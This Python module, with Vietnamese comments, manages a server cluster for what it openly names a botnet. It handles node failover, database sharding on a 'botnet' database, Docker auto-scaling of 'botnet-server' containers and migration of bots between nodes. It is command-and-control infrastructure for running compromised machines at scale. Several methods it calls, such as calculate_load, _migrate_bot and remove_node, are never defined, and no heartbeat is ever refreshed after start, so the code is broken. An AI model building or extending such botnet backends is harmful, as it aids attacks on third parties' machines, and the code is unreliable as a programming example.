import threading
import queue
import json
import time
import psutil
import docker
import logging
from typing import Dict, List, Optional
import random
from dataclasses import dataclass
from datetime import datetime
from core.server import Server

@dataclass 
class ShardConfig:
    """Cấu hình database shard"""
    shard_id: str
    host: str
    port: int
    db_name: str
    key_range: tuple  # Key range cho shard này
    replica_set: Optional[str] = None
    
@dataclass
class AutoScaleConfig:
    """Cấu hình auto-scaling"""
    min_nodes: int = 2
    max_nodes: int = 10
    scale_up_threshold: float = 80.0  # % load để scale up
    scale_down_threshold: float = 20.0  # % load để scale down
    cooldown_period: int = 300  # Seconds giữa các lần scale

class ServerNode:
    def __init__(self, host: str, port: int, name: str = None):
        self.logger = logging.getLogger('server_node')
        self.host = host
        self.port = port
        self.name = name or f"{host}:{port}"
        self.server = Server(host, port)
        self.status = "stopped"
        self.load = 0
        self.bot_count = 0
        self.last_heartbeat = 0
        self.metrics = {}
        self.shards: List[ShardConfig] = []
        
    def start(self) -> bool:
        """Khởi động server node"""
        try:
            # Khởi tạo database shards
            self._init_shards()
            
            # Khởi động server
            self.server.initialize()
            self.status = "running"
            self.last_heartbeat = time.time()
            
            # Start metrics collection
            self._start_metrics_collection()
            
            return True
            
        except Exception as e:
            self.logger.error(f"Start error: {str(e)}")
            self.status = "error" 
            return False
            
    def _init_shards(self):
        """Khởi tạo database shards"""
        try:
            # Create shards based on key ranges
            shard_ranges = [
                (0, 1000000),
                (1000001, 2000000),
                (2000001, 3000000)
            ]
            
            for i, key_range in enumerate(shard_ranges):
                shard = ShardConfig(
                    shard_id=f"shard_{i}",
                    host=f"shard{i}.db",
                    port=27017,
                    db_name="botnet",
                    key_range=key_range
                )
                self.shards.append(shard)
                
        except Exception as e:
            self.logger.error(f"Shard init error: {str(e)}")
            
    def _start_metrics_collection(self):
        """Start collecting metrics"""
        def collect_metrics():
            while self.status == "running":
                try:
                    # System metrics
                    self.metrics.update({
                        'cpu': psutil.cpu_percent(),
                        'memory': psutil.virtual_memory().percent,
                        'disk': psutil.disk_usage('/').percent,
                        'network': self._get_network_usage(),
                        'timestamp': datetime.now().isoformat()
                    })
                    
                    # Calculate load
                    self.load = self.calculate_load()
                    
                    time.sleep(5)
                    
                except Exception as e:
                    self.logger.error(f"Metrics error: {str(e)}")
                    time.sleep(5)
                    
        threading.Thread(
            target=collect_metrics,
            daemon=True
        ).start()
        
    def _get_network_usage(self) -> float:
        """Get network usage percentage"""
        try:
            net_io = psutil.net_io_counters()
            return (net_io.bytes_sent + net_io.bytes_recv) / 1024 / 1024  # MB
        except:
            return 0

class ServerCluster:
    def __init__(self):
        self.logger = logging.getLogger('server_cluster')
        self.nodes: Dict[str, ServerNode] = {}
        self.status = "stopped"
        
        # Docker client for auto-scaling
        self.docker = docker.from_env()
        
        # Auto-scaling config
        self.scale_config = AutoScaleConfig()
        self.last_scale = 0
        
        # High availability
        self.primary_node = None
        self.replica_nodes = []
        
        # Load balancing
        self.command_queue = queue.Queue()
        self.result_queue = queue.Queue()
        self.sync_lock = threading.Lock()
        self.max_load = 80
        self.rebalance_threshold = 20
        
    def add_node(self, host: str, port: int, name: str = None, 
                is_primary: bool = False) -> bool:
        """Thêm node mới"""
        try:
            node = ServerNode(host, port, name)
            self.nodes[node.name] = node
            
            if is_primary:
                if self.primary_node:
                    # Demote current primary to replica
                    self.replica_nodes.append(self.primary_node)
                self.primary_node = node
            else:
                self.replica_nodes.append(node)
                
            return True
            
        except Exception as e:
            self.logger.error(f"Add node error: {str(e)}")
            return False
            
    def start_cluster(self):
        """Khởi động cluster"""
        try:
            # Khởi động primary node trước
            if self.primary_node:
                self.primary_node.start()
                
            # Khởi động các replica nodes
            for node in self.replica_nodes:
                node.start()
                
            self.status = "running"
            
            # Start monitor threads
            self._start_monitoring()
            
            return True
            
        except Exception as e:
            self.logger.error(f"Start cluster error: {str(e)}")
            return False
            
    def _start_monitoring(self):
        """Start các monitoring threads"""
        # Node monitor
        threading.Thread(
            target=self._monitor_nodes,
            daemon=True
        ).start()
        
        # Auto-scaler
        threading.Thread(
            target=self._auto_scale,
            daemon=True
        ).start()
        
        # Load balancer
        threading.Thread(
            target=self._balance_load,
            daemon=True
        ).start()
        
    def _monitor_nodes(self):
        """Monitor node health"""
        while self.status == "running":
            try:
                failed_nodes = []
                
                # Check each node
                for node in self.nodes.values():
                    # Node không phản hồi trong 30s
                    if time.time() - node.last_heartbeat > 30:
                        failed_nodes.append(node)
                        
                # Handle failed nodes
                for node in failed_nodes:
                    self._handle_node_failure(node)
                    
                time.sleep(10)
                
            except Exception as e:
                self.logger.error(f"Monitor error: {str(e)}")
                time.sleep(10)
                
    def _handle_node_failure(self, node: ServerNode):
        """Xử lý node failure"""
        try:
            # Remove from cluster
            if node.name in self.nodes:
                del self.nodes[node.name]
                
            # If primary node failed
            if node == self.primary_node:
                # Promote replica to primary
                if self.replica_nodes:
                    new_primary = self.replica_nodes.pop(0)
                    self.primary_node = new_primary
                    self.logger.info(f"Promoted {new_primary.name} to primary")
                    
            elif node in self.replica_nodes:
                self.replica_nodes.remove(node)
                
            # Try to start replacement node
            self._start_replacement_node()
            
        except Exception as e:
            self.logger.error(f"Handle failure error: {str(e)}")
            
    def _start_replacement_node(self):
        """Start node mới thay thế"""
        try:
            # Get next available port
            used_ports = [n.port for n in self.nodes.values()]
            port = max(used_ports) + 1
            
            # Create and start new node
            name = f"node_{port}"
            if self.add_node("localhost", port, name):
                node = self.nodes[name]
                if node.start():
                    self.logger.info(f"Started replacement node {name}")
                    
        except Exception as e:
            self.logger.error(f"Replacement error: {str(e)}")
            
    def _auto_scale(self):
        """Auto-scaling loop"""
        while self.status == "running":
            try:
                if time.time() - self.last_scale < self.scale_config.cooldown_period:
                    time.sleep(60)
                    continue
                    
                # Calculate average load
                loads = [n.load for n in self.nodes.values()]
                avg_load = sum(loads) / len(loads) if loads else 0
                
                # Scale up
                if avg_load > self.scale_config.scale_up_threshold:
                    if len(self.nodes) < self.scale_config.max_nodes:
                        self._scale_up()
                        
                # Scale down        
                elif avg_load < self.scale_config.scale_down_threshold:
                    if len(self.nodes) > self.scale_config.min_nodes:
                        self._scale_down()
                        
                time.sleep(60)
                
            except Exception as e:
                self.logger.error(f"Auto-scale error: {str(e)}")
                time.sleep(60)
                
    def _scale_up(self):
        """Scale up cluster"""
        try:
            # Start new container
            container = self.docker.containers.run(
                "botnet-server",
                detach=True,
                network="botnet"
            )
            
            # Get container IP
            container.reload()
            ip = container.attrs['NetworkSettings']['Networks']['botnet']['IPAddress']
            
            # Add node to cluster
            if self.add_node(ip, 8080):
                self.last_scale = time.time()
                self.logger.info(f"Scaled up - new node at {ip}")
                
        except Exception as e:
            self.logger.error(f"Scale up error: {str(e)}")
            
    def _scale_down(self):
        """Scale down cluster"""
        try:
            # Get least loaded node
            node = min(self.replica_nodes, key=lambda x: x.load)
            
            # Migrate bots away
            self._migrate_bots(node)
            
            # Remove node
            self.remove_node(node.name)
            
            # Stop container
            containers = self.docker.containers.list(
                filters={'name': f'*{node.host}*'}
            )
            for container in containers:
                container.stop()
                container.remove()
                
            self.last_scale = time.time()
            self.logger.info(f"Scaled down - removed {node.name}")
            
        except Exception as e:
            self.logger.error(f"Scale down error: {str(e)}")
            
    def _migrate_bots(self, from_node: ServerNode):
        """Di chuyển bots khỏi node"""
        try:
            # Get target nodes
            targets = [n for n in self.nodes.values() 
                      if n != from_node and n.load < self.max_load]
                      
            if not targets:
                return
                
            # Migrate each bot
            bots = from_node.server.botnet.get_bots()
            for bot in bots:
                target = min(targets, key=lambda x: x.load)
                self._migrate_bot(bot, from_node, target)
                
        except Exception as e:
            self.logger.error(f"Migration error: {str(e)}")
            
    def get_shard_for_key(self, key: int) -> Optional[ShardConfig]:
        """Get shard phù hợp cho key"""
        try:
            # Check primary node shards first
            if self.primary_node:
                for shard in self.primary_node.shards:
                    if shard.key_range[0] <= key <= shard.key_range[1]:
                        return shard
                        
            # Check replica shards
            for node in self.replica_nodes:
                for shard in node.shards:
                    if shard.key_range[0] <= key <= shard.key_range[1]:
                        return shard
                        
            return None
            
        except Exception as e:
            self.logger.error(f"Get shard error: {str(e)}")
            return None
            
    def get_status(self) -> Dict:
        """Get cluster status"""
        try:
            return {
                'status': self.status,
                'primary': self.primary_node.to_dict() if self.primary_node else None,
                'replicas': [n.to_dict() for n in self.replica_nodes],
                'total_nodes': len(self.nodes),
                'total_bots': sum(n.bot_count for n in self.nodes.values()),
                'avg_load': sum(n.load for n in self.nodes.values()) / len(self.nodes) if self.nodes else 0,
                'shards': sum(len(n.shards) for n in self.nodes.values()),
                'auto_scale': {
                    'min_nodes': self.scale_config.min_nodes,
                    'max_nodes': self.scale_config.max_nodes,
                    'last_scale': self.last_scale
                }
            }
        except Exception as e:
            self.logger.error(f"Get status error: {str(e)}")
            return {}